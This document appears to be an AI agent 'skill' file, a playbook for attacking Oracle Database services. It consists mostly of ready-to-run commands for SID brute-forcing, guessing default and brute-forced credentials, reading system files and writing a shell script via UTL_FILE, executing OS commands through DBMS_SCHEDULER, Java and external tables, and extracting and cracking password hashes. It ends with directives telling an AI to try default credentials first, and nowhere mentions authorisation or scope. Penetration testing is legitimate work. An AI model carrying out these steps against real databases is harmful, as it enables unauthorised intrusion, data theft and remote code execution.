# Oracle Database Pentesting Skill

## Goal

Exploit Oracle Database services to extract data, escalate privileges, and achieve remote code execution.

## Methodology

1. **Discovery**: Identify Oracle services and SIDs
2. **SID Enumeration**: Brute-force SID names
3. **Authentication Testing**: Default credentials and brute-force
4. **Enumeration**: Extract database objects and data
5. **Exploitation**: PL/SQL injection, privilege escalation, OS command execution

## Ports

- 1521/TCP: Oracle TNS Listener
- 1522-1528/TCP: Additional listeners
- 5500/TCP: Oracle Enterprise Manager

## Tools

* **odat**: Oracle Database Attacking Tool
* **nmap**: Oracle scripts
* **tnscmd10g**: TNS command tool
* **sqlplus**: Oracle SQL client
* **Metasploit**: Oracle modules

## Example Commands

```bash
# Nmap Oracle detection
nmap -p1521 --script oracle-* target
nmap -p1521 --script oracle-sid-brute target
nmap -p1521 --script oracle-brute target
nmap -p1521 --script oracle-enum-users target

# Using odat for comprehensive testing
odat all -s target -p 1521

# TNS command
tnscmd10g version -h target
tnscmd10g status -h target
```

## SID Enumeration

```bash
# Using nmap
nmap -p1521 --script oracle-sid-brute target

# Using odat
odat sidguesser -s target -p 1521

# Using tnscmd10g
tnscmd10g services -h target

# Using metasploit
use auxiliary/scanner/oracle/sid_enum
use auxiliary/scanner/oracle/sid_brute

# Common SIDs:
# ORCL, XE, ORACLE, PLSExtProc, TEST, DEV, PROD
```

## Authentication Testing

```bash
# Default accounts
odat passwordguesser -s target -p 1521 -d SID

# Common default credentials:
# SYS / oracle, SYS / change_on_install
# SYSTEM / oracle, SYSTEM / manager
# DBSNMP / dbsnmp
# SCOTT / tiger
# HR / hr

# Brute force
odat passwordguesser -s target -p 1521 -d SID --accounts-file accounts.txt

# Using nmap
nmap -p1521 --script oracle-brute --script-args oracle-brute.sid=ORCL target

# Using Metasploit
use auxiliary/scanner/oracle/oracle_login
set SID ORCL
set RHOSTS target
run
```

## Database Enumeration

```bash
# Using odat
odat all -s target -p 1521 -d SID -U user -P password

# Using sqlplus
sqlplus user/password@target:1521/SID

# SQL enumeration
SELECT * FROM v$version;
SELECT username FROM dba_users;
SELECT * FROM dba_role_privs WHERE grantee='USER';
SELECT * FROM dba_sys_privs WHERE grantee='USER';
SELECT table_name FROM all_tables;
SELECT * FROM hr.employees;
```

## Privilege Escalation

```bash
# Check current privileges
SELECT * FROM session_privs;
SELECT * FROM user_role_privs;

# Using odat for privesc
odat privesc -s target -p 1521 -d SID -U user -P password --get-privs
odat privesc -s target -p 1521 -d SID -U user -P password --dba-with-execute-any-procedure

# Common privilege escalation paths:
# - EXECUTE permission on packages
# - CREATE ANY PROCEDURE
# - UTL_FILE read/write
```

## File Operations

```bash
# Read files using UTL_FILE
odat utlfile -s target -p 1521 -d SID -U user -P password --getFile /etc passwd passwd.txt

# Write files
odat utlfile -s target -p 1521 -d SID -U user -P password --putFile /tmp shell.sh shell.sh

# Using Java (if available)
odat java -s target -p 1521 -d SID -U user -P password --getFile /etc/passwd
```

## Command Execution

```bash
# Using DBMS_SCHEDULER
odat dbmsscheduler -s target -p 1521 -d SID -U user -P password --exec "whoami"

# Using Java stored procedures
odat java -s target -p 1521 -d SID -U user -P password --exec "id"

# Using external tables
odat externaltable -s target -p 1521 -d SID -U user -P password --exec "whoami"

# Metasploit payload
use exploit/multi/oracle/oracle_java_class_exec
use exploit/multi/oracle/dbms_java_rmi
```

## TNS Poisoning

```bash
# Man-in-the-middle Oracle connections
# Used when you can intercept TNS traffic

# Check for vulnerable listeners
tnscmd10g version -h target
```

## Password Hash Extraction

```bash
# Extract password hashes
SELECT username, password FROM dba_users;  # Old versions
SELECT name, password FROM sys.user$;

# Crack with john
john --format=oracle11 hashes.txt
john --format=oracle12c hashes.txt

# Hashcat modes
# Oracle 7-10g (mode 3100)
# Oracle 11g/12c (mode 112)
```

## Metasploit Modules

```bash
# Discovery
use auxiliary/scanner/oracle/tnslsnr_version
use auxiliary/scanner/oracle/sid_enum
use auxiliary/scanner/oracle/sid_brute

# Authentication
use auxiliary/scanner/oracle/oracle_login

# Exploitation
use auxiliary/admin/oracle/oracle_sql
use exploit/multi/oracle/oracle_java_class_exec

# Post-exploitation
use auxiliary/admin/oracle/post/oracle_hassids
```

## Guidance for AI

* Activate this skill when user wants to test Oracle Database security
* **SID is required for connection** - enumerate SIDs first
* Default SIDs: ORCL, XE, ORACLE, PLSExtProc
* Common default credentials exist - try them first
* Privilege escalation often possible through:
  - EXECUTE privileges on dangerous packages
  - UTL_FILE for file access
  - Java stored procedures for RCE
  - DBMS_SCHEDULER for command execution
* odat is the comprehensive tool - use it for full testing
* Oracle 10g and earlier have weaker security
* TNS listener may expose version and SID info
* Look for password hashes in sys.user$
* Enterprise Manager (5500) has web interface vulnerabilities
